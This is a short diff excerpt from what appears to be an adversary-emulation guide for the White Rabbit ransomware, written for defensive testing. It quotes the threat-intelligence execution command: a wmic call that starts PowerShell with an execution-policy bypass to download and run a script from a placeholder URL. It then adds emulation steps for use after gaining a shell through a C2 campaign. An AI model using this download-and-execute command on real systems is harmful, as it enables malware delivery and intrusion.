@@ -13,6 +13,7 @@ White Rabbit was first observed attacking a US bank in December 2021 using doubl
 7. As per CTI, execution of White Rabbit was done using ```wmic process call create "cmd /c powershell.exe -nop -ep bypass -c iex (New-Object System.Net.WebClient).DownloadString ('https://payloadurl/')"```
 
 ## Manual Emulation
+Launch a campaign with the C2 parameters you desire. Once you have a shell, execute the following procedures:
 ```
 loader --load run
 run cmd /c mkdir "%USERPROFILE%\Desktop\WhiteRabbit"
